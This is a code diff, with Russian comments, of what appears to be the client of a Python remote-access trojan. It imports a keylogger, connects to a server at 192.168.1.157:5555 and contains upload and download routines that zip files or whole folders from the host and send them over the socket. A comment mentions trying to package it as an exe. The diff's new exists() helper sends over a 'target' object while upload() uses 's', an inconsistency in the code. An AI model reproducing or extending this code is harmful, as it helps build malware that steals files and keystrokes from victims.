@@ -4,6 +4,7 @@ import subprocess
 import os
 import re # Чтобы диски определить
 
+# Не получается получить exe файл с включнием своих скриптов  
 import threading
 import keylogger
 
@@ -27,7 +28,7 @@ from PIL import Image
 
 ####  Constants
 
-SERVER_IP = '127.0.0.1'
+SERVER_IP = '192.168.1.157'#'127.0.0.1'
 SERVER_PORT = 5555
 
 QUIT = True
@@ -61,18 +62,31 @@ def reliable_recv():
         except ValueError:
             continue
 
+def exists(name):
+    if (os.path.exists(name) == False):
+        f = open('ERROR_DOESNT_EXIST.txt', 'a+')
+        f.write('ERROR FILE or FOLDER DOESNT EXIST')
+        f.close()
+        f = open('ERROR_DOESNT_EXIST.txt', 'rb')
+        target.send(f.read())
+        f.close()
+        os.remove('ERROR_DOESNT_EXIST.txt')
+        return False
+    return True
+
 def upload(name):
     # Файл бинарный, поэтому нужно исп rb
-    if (os.path.isdir(name)):
-        shutil.make_archive('archive_' + name, 'zip', name)
-        f = open('archive_' + name + '.zip', 'rb')
-        s.send(f.read())
-        f.close()
-        os.remove('archive_' + name + '.zip')
-    else:
-        f = open(name, 'rb')
-        s.send(f.read())
-        f.close()
+    if (exists(name)):
+        if (os.path.isdir(name)):
+            shutil.make_archive('archive_' + name, 'zip', name)
+            f = open('archive_' + name + '.zip', 'rb')
+            s.send(f.read())
+            f.close()
+            os.remove('archive_' + name + '.zip')
+        else:
+            f = open(name, 'rb')
+            s.send(f.read())
+            f.close()
 
 def download(object_type, name):
     # Файл бинарный, поэтому нужно исп wb 
